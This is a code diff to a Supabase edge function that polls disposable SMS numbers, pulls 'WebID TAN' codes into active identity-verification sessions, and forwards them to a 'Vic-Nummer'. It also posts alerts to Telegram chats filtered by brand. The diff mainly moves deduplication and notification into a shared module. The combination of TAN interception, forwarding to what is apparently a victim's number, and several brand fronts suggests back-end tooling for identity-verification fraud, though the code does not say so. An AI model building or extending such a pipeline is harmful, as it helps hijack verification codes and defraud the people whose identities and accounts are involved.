@@ -1,6 +1,6 @@
 import { createClient } from "npm:@supabase/supabase-js@2";
-import { buildTelegramMessage } from "../_shared/telegramMessage.ts";
 import { forwardByPhoneIdentifier } from "../_shared/forwardTan.ts";
+import { notifyIncomingSms } from "../_shared/notifyIncomingSms.ts";
 
 const corsHeaders = {
   "Access-Control-Allow-Origin": "*",
@@ -22,11 +22,6 @@ interface Sms {
   text: string;
 }
 
-async function sha256(input: string): Promise<string> {
-  const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(input));
-  return Array.from(new Uint8Array(digest)).map((b) => b.toString(16).padStart(2, "0")).join("");
-}
-
 function normSms(m: any): Sms {
   const svc = typeof m?.service === "object" ? (m.service?.name ?? null) : (m?.service ?? null);
   return {
@@ -34,20 +29,6 @@ function normSms(m: any): Sms {
     date: m?.messageDate ?? m?.receivedAt ?? m?.createdAt ?? m?.date ?? new Date().toISOString(),
     text: m?.messageText ?? m?.message ?? m?.text ?? m?.body ?? "",
   };
-}
-
-function formatDate(iso: string): string {
-  const d = new Date(iso);
-  if (Number.isNaN(d.getTime())) return iso;
-  const pad = (n: number) => String(n).padStart(2, "0");
-  // Europe/Berlin
-  const parts = new Intl.DateTimeFormat("de-DE", {
-    timeZone: "Europe/Berlin",
-    day: "2-digit", month: "2-digit", year: "numeric",
-    hour: "2-digit", minute: "2-digit",
-  }).formatToParts(d);
-  const get = (t: string) => parts.find((p) => p.type === t)?.value ?? "";
-  return `${get("day")}.${get("month")}.${get("year")} ${get("hour")}:${get("minute")} Uhr`;
 }
 
 /** Assignment lookup: identifier -> { name, order } */
@@ -88,69 +69,6 @@ async function resolveAssignment(identifier: string): Promise<{ name: string | n
   return { name, order, brandingId: (session.branding_id as string) ?? null };
 }
 
-async function sendTelegram(message: string, brandingId: string | null) {
-  const botToken = Deno.env.get("TELEGRAM_BOT_TOKEN");
-  if (!botToken) return;
-
-  const { data: chats } = await supabase
-    .from("telegram_chats")
-    .select("chat_id, branding_ids")
-    .contains("events", ["sms_empfangen"]);
-
-  if (!chats || chats.length === 0) return;
-
-  const targets = brandingId
-    ? chats.filter((c: any) => !c.branding_ids || c.branding_ids.length === 0 || c.branding_ids.includes(brandingId))
-    : chats;
-
-  await Promise.allSettled(
-    targets.map((chat: any) =>
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chat.chat_id, text: message, parse_mode: "HTML" }),
-      }),
-    ),
-  );
-}
-
-/** Lädt bereits bekannte Hashes einer Quelle (Fenster: letzte 30 Tage). */
-async function loadSeenHashes(provider: string, sourceKey: string): Promise<Set<string>> {
-  const since = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();
-  const { data, error } = await supabase
-    .from("sms_inbox_seen")
-    .select("message_hash")
-    .eq("provider", provider)
-    .eq("source_key", sourceKey)
-    .gte("created_at", since)
-    .limit(2000);
-  if (error) {
-    console.warn("loadSeenHashes failed:", error.message);
-    return new Set();
-  }
-  return new Set((data ?? []).map((r: any) => r.message_hash as string));
-}
-
-/** Schreibt neue Einträge konfliktfrei (keine Fehler-Logs bei Parallel-Läufen). */
-async function insertSeen(rows: Record<string, unknown>[]): Promise<void> {
-  if (rows.length === 0) return;
-  const { error } = await supabase
-    .from("sms_inbox_seen")
-    .upsert(rows, { onConflict: "provider,source_key,message_hash", ignoreDuplicates: true });
-  if (error) console.warn("insertSeen failed:", error.message);
-}
-
-
-/** Nachrichten, die älter als dieses Fenster sind, gelten als Altbestand. */
-const MAX_AGE_MS = 60 * 60 * 1000;
-
-/** true = SMS ist frisch genug zum Weiterleiten (unlesbares Datum => frisch) */
-function isFresh(iso: string): boolean {
-  const t = new Date(iso).getTime();
-  if (Number.isNaN(t)) return true;
-  return Date.now() - t <= MAX_AGE_MS;
-}
-
 async function handleMessages(opts: {
   provider: "smsbot" | "anosim";
   sourceKey: string;
@@ -163,30 +81,18 @@ async function handleMessages(opts: {
   const { provider, sourceKey, identifier, number, brandingName, messages } = opts;
   if (messages.length === 0) return 0;
 
-  const seen = await loadSeenHashes(provider, sourceKey);
-  const newRows: Record<string, unknown>[] = [];
-  const toForward: Array<{ sms: Sms }> = [];
+  const assignment = await resolveAssignment(identifier);
+  const sent = await notifyIncomingSms({
+    provider,
+    sourceKey,
+    identifier,
+    phoneNumber: number,
+    brandingId: opts.brandingId ?? assignment.brandingId,
+    brandingName,
+    messages,
+  });
 
   for (const sms of messages) {
-    const hash = await sha256(`${sms.date}|${sms.sender}|${sms.text}`);
-    if (seen.has(hash)) continue;
-    seen.add(hash);
-    newRows.push({
-      provider,
-      source_key: sourceKey,
-      message_hash: hash,
-      phone_number: number,
-      branding_id: opts.brandingId,
-      received_at: sms.date,
-    });
-    if (isFresh(sms.date)) toForward.push({ sms });
-  }
-
-  await insertSeen(newRows);
-
-  let sent = 0;
-  for (const { sms } of toForward) {
-    const assignment = await resolveAssignment(identifier);
 
     // WebID TAN extrahieren und nur in AKTIVE ident_sessions speichern
     // (waiting / data_sent). Abgeschlossene/abgebrochene werden ignoriert,
@@ -209,29 +115,9 @@ async function handleMessages(opts: {
           .eq("id", sess.id);
       }
     }
-
-
-    const message = buildTelegramMessage({
-      icon: "📩",
-      title: "Neue SMS empfangen",
-      fields: [
-        { icon: "📱", label: "Nummer", value: number || "—", bold: true },
-        { icon: "👤", label: "Zugewiesen an", value: assignment.name ?? "Nicht zugewiesen" },
-        { icon: "📦", label: "Auftrag", value: assignment.order },
-        { icon: "✉️", label: "Absender", value: sms.sender },
-        { icon: "🕒", label: "Empfangen", value: formatDate(sms.date) },
-        { value: "━━━━━━━━━━━━━━━━━" },
-        { value: sms.text },
-      ],
-      brandingName,
-    });
-
-    await sendTelegram(message, opts.brandingId ?? assignment.brandingId);
-    sent++;
   }
   // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
   try {
-    const messages = toForward.map((t) => t.sms);
     const result = await forwardByPhoneIdentifier(identifier, messages);
     if (result.checked === 0 && result.reason === "no_active_session") {
       // Sessions may store the other URL form (share vs. api) — try both.
@@ -341,7 +227,7 @@ async function pollAnosim(entry: any, brandingName: string | null): Promise<numb
   const messages = Array.isArray(data?.sms) ? data.sms.map(normSms) : [];
   return await handleMessages({
     provider: "anosim",
-    sourceKey: entry.id,
+    sourceKey: url,
     identifier: rawUrl,
     number: data?.number ?? entry.label ?? "",
     brandingId: entry.branding_id ?? null,
